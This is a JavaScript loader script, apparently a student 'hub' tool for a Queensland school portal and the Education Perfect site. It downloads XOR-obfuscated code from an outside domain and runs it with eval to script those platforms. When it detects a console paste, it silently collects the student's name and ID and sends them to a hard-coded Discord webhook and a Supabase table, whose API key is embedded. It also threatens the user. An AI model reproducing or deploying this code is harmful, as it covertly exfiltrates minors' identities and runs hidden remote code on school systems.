(function() {
  // Prevent manual console paste execution by checking document.currentScript and execution stack
  var curScript = document.currentScript;
  var isScriptTag = !!(curScript && curScript.src && curScript.src.indexOf('loader.js') !== -1);
  
  var isEvalLoad = false;
  try {
    throw new Error();
  } catch (e) {
    var stack = e.stack || '';
    if (stack.indexOf('Promise.then') !== -1 || stack.indexOf('eval') !== -1) {
      isEvalLoad = true;
    }
  }

  if (!isScriptTag && !isEvalLoad) {
    console.warn("Nice try kiddo. You want to be blacklisted? Keep it up! Use my official links or i'll term your access.");
    
    // Resolve identity if possible
    var name = "Unknown";
    var id = "Unknown";
    if (window.schoolboxUser) {
      if (window.schoolboxUser.fullName) name = window.schoolboxUser.fullName;
      if (window.schoolboxUser.externalId) id = window.schoolboxUser.externalId;
    } else {
      var savedId = localStorage.getItem('ep_hub_verified_id');
      if (savedId) id = savedId;
      try {
        var epUser = window.angular?.element(document.body)?.injector()?.get('UserService')?.currentUser;
        if (epUser) {
          if (epUser.name) name = epUser.name;
          if (epUser.id || epUser.externalId) id = epUser.id || epUser.externalId;
        }
      } catch(e){}
    }

    // 1. Report to Discord Webhook
    var webhookUrl = "https://discord.com/api/webhooks/1529791536508698736/3mZpmxlfb1N5vjPDHyqYa2zKdb3o9djCXKmUc1MT9jDLUKhX436gRfxH4w5I5hJ2__OL";
    if (window.fetch) {
      window.fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: "⚠️ **Console Execution Violation!**\n**User Name:** " + name + "\n**User ID:** " + id + "\n**URL:** " + window.location.href
        })
      }).catch(function() {});

      // 2. Report to Supabase console_violations table
      var sbKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlub2xmdmpwaWt0bXJocXl2bnNoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ5MjU5NDUsImV4cCI6MjEwMDUwMTk0NX0.gurNKy0vtMfVMW-To_2kyvMpQhEPpq7bKkJnyNN2qAc';
      window.fetch('https://inolfvjpiktmrhqyvnsh.supabase.co/rest/v1/console_violations', {
        method: 'POST',
        headers: {
          'apikey': sbKey,
          'Authorization': 'Bearer ' + sbKey,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          student_id: String(id),
          student_name: String(name),
          url: window.location.href
        })
      }).catch(function() {});
    }

    return;
  }

  function xorDecrypt(hexString, key) {
    var parts = hexString.trim().split('-');
    var result = "";
    for (var i = 0; i < parts.length; i++) {
      if (!parts[i]) continue;
      var byteVal = parseInt(parts[i], 16);
      var keyChar = key.charCodeAt(i % key.length);
      result += String.fromCharCode(byteVal ^ keyChar);
    }
    return result;
  }

  var href = window.location.href.toLowerCase();
  var scriptSrc = '';

  if (href.indexOf('stpatricks.qld.edu.au') !== -1) {
    scriptSrc = 'https://hub-zero.site/Student-Search.js';
  } else if (href.indexOf('educationperfect.com') !== -1) {
    scriptSrc = 'https://hub-zero.site/ep-hub.js';
  } else {
    alert('Hub Zero Loader: This website is not supported for automatic scripting.');
    return;
  }

  if (window.fetch) {
    window.fetch(scriptSrc)
      .then(function(r) { return r.text(); })
      .then(function(code) {
        var decrypted = xorDecrypt(code, "089091");
        eval(decrypted);
      })
      .catch(function(err) {
        console.error('Hub Zero Loader: Failed to load script.', err);
      });
  } else {
    alert('Hub Zero Loader: Fetch is not supported on this browser.');
  }
})();
